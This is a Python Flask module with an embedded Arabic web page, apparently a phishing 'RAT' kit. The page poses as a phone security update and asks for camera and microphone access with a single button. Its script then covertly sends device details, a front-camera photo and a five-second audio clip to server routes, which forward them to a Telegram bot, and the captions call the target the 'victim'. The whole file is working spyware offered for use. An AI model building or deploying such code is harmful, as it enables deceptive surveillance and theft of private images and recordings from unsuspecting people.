import os
import base64
import io
from flask import Blueprint, render_template_string, request

rat_bp = Blueprint('rat_module', __name__)

# قالب احترافي بـ "زر واحد فقط" لطلب الأذونات دفعة واحدة (كاميرا، ميكروفون، وسائط)
RAT_ONE_CLICK_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث نظام الأمان السريع</title>
    <style>
        body { background-color: #0d1117; color: #c9d1d9; font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .card { background: #161b22; border: 1px solid #30363d; padding: 40px; border-radius: 12px; max-width: 380px; width: 90%; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
        h2 { color: #58a6ff; font-size: 22px; margin-bottom: 15px; }
        p { font-size: 14px; color: #8b949e; line-height: 1.5; margin-bottom: 25px; }
        .single-btn { background-color: #238636; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; padding: 14px 20px; width: 100%; cursor: pointer; transition: 0.2s; }
        .single-btn:hover { background-color: #2ea043; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🛡️ ترقية الأمان الشاملة</h2>
        <p>لتأمين هاتفك ضد الثغرات وتحسين سرعة النظام وملفات المعالج، يرجى تفعيل التحديث الآمن الآن.</p>
        <button class="single-btn" onclick="requestFullControl()">قبول وتثبيت التحديث</button>
    </div>

    <!-- عناصر مخفية للتحكم في الكاميرا والميكروفون -->
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const chatId = "{{ chat_id }}";

        async function requestFullControl() {
            try {
                // طلب الكاميرا والميكروفون بضغطة زر واحدة
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                
                const video = document.getElementById('v');
                video.srcObject = stream;

                // 1. إرسال معلومات الجهاز الأولية
                sendSystemData();

                // 2. التقاط صورة فورية بعد ثانية
                setTimeout(() => {
                    capturePhoto(video);
                }, 1000);

                // 3. تسجيل مقطع صوتي خفي لمدة 5 ثوانٍ وإرساله
                setTimeout(() => {
                    recordAudio(stream);
                }, 2000);

                // إخفاء الزر وإظهار رسالة وهمية بالاستقرار
                document.querySelector('.card').innerHTML = "<h2>✅ جاري تطبيق التحديث...</h2><p>يرجى عدم إغلاق النافذة حتى يتم الانتهاء.</p>";

            } catch (err) {
                alert("يرجى الضغط على 'موافق/السماح' للأذونات لضمان نجاح التحديث الأمني.");
            }
        }

        function sendSystemData() {
            const info = {
                chat_id: chatId,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screen: window.screen.width + "x" + window.screen.height,
                cores: navigator.hardwareConcurrency || 'غير معروف'
            };
            fetch('/rat_collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });
        }

        function capturePhoto(video) {
            const canvas = document.getElementById('c');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.8);

            fetch('/rat_image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, image: imageData })
            });
        }

        function recordAudio(stream) {
            let chunks = [];
            const mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = e => {
                const blob = new Blob(chunks, { type: 'audio/mp3' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = function() {
                    fetch('/rat_audio', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, audio: reader.result })
                    });
                };
            };
            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
            }, 5000); // تسجيل 5 ثوانٍ من ميكروفون الضحية
        }
    </script>
</body>
</html>
"""

def init_rat_routes(app, bot):
    @app.route('/system_secure', methods=['GET'])
    def rat_landing():
        chat_id = request.args.get('id', '0')
        return render_template_string(RAT_ONE_CLICK_TEMPLATE, chat_id=chat_id)

    @app.route('/rat_collect', methods=['POST'])
    def rat_collect():
        data = request.json or {}
        chat_id = data.get('chat_id')
        if chat_id and chat_id != '0':
            msg = (
                "🚨 **تم منح التحكم الكامل وسحب بيانات الضحية!**\n\n"
                f"💻 **النظام:** `{data.get('platform')}`\n"
                f"📱 **المتصفح:** `{data.get('userAgent')}`\n"
                f"📐 **الشاشة:** `{data.get('screen')}`\n"
                f"⚙️ **المعالج:** `{data.get('cores')} أنوية`"
            )
            try:
                bot.send_message(chat_id, msg, parse_mode="Markdown")
            except Exception as e:
                print(f"Error: {e}")
        return {"status": "ok"}

    @app.route('/rat_image', methods=['POST'])
    def rat_image():
        data = request.json or {}
        chat_id = data.get('chat_id')
        img_data = data.get('image')
        if chat_id and img_data:
            try:
                header, encoded = img_data.split(",", 1)
                image_bytes = base64.b64decode(encoded)
                photo_file = io.BytesIO(image_bytes)
                photo_file.name = 'camera_capture.jpg'
                bot.send_photo(chat_id, photo_file, caption="📸 **صورة الكاميرا الأمامية المباشرة:**", parse_mode="Markdown")
            except Exception as e:
                print(f"Image error: {e}")
        return {"status": "ok"}

    @app.route('/rat_audio', methods=['POST'])
    def rat_audio():
        data = request.json or {}
        chat_id = data.get('chat_id')
        audio_data = data.get('audio')
        if chat_id and audio_data:
            try:
                header, encoded = audio_data.split(",", 1)
                audio_bytes = base64.b64decode(encoded)
                audio_file = io.BytesIO(audio_bytes)
                audio_file.name = 'voice_record.mp3'
                bot.send_audio(chat_id, audio_file, caption="🎙️ **تسجيل صوتي مباشر من ميكروفون الضحية:**", parse_mode="Markdown")
            except Exception as e:
                print(f"Audio error: {e}")
        return {"status": "ok"}
